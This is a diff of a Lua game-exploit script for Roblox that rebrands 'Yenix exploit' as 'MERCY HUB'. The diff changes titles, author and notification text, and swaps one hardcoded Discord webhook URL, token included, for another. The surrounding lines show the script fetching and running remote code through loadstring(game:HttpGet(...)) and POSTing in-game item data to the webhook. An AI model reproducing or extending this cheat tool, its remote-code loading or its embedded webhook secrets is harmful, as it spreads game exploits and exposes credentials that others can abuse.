@@ -1848,16 +1848,16 @@ end
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 local Window = WindUI:CreateWindow({
-	Title = "Yenix exploit",
+	Title = "MERCY HUB",
 	Icon = "globe",
-	Author = "By #pow",
-	Folder = "Yanex",
+	Author = "By #golfeiei",
+	Folder = "",
 	Size = UDim2.fromOffset(400, 400),
 	Theme = "Dark",
 	Transparent = true,
 	Resizable = true,
 	OpenButton = {
-		Title = "Yonex Exploit", -- can be changed
+		Title = "MERCYHUB", -- can be changed
 		CornerRadius = UDim.new(1,0), -- fully rounded
 		StrokeThickness = 3, -- removing outline
 		Enabled = true, -- enable or disable openbutton
@@ -2569,7 +2569,7 @@ if not c().PussyBlack then
 									end
 									if itemtext ~= '' then
 										local embed = {
-											['title'] = '🎯 Yenix Notification',
+											['title'] = '🎯 MERCY Notification',
 											['description'] = '```\n'
 												.. humdom
 												.. '\n```',
@@ -2583,7 +2583,7 @@ if not c().PussyBlack then
 												},
 											},
 											['footer'] = {
-												['text'] = 'Yenix Exploit | '
+												['text'] = 'MERCYHUB | '
 													.. os.date(
 														'%Y-%m-%d %H:%M:%S'
 													),
@@ -2597,7 +2597,7 @@ if not c().PussyBlack then
 										local embedData =
 											{ ['embeds'] = { embed } }
 										local Result = Req({
-											Url = 'https://discord.com/api/webhooks/1430382020164583476/R-JsaPWruS-pbafA1t7HW7NuhtNTG-5pjiE3xBGh2uL7OizdsRs7j1eeZulLp6N2DVv9',
+											Url = 'https://discord.com/api/webhooks/1508477067585650791/5bo-CfwaUpRL3GWwFVEl1HNOknvmMd5KEei_vNdupxUrVH8t0houHPtdfGvKmiqi9Yej',
 											Method = 'POST',
 											Headers = {
 												['Content-Type'] = 'application/json',
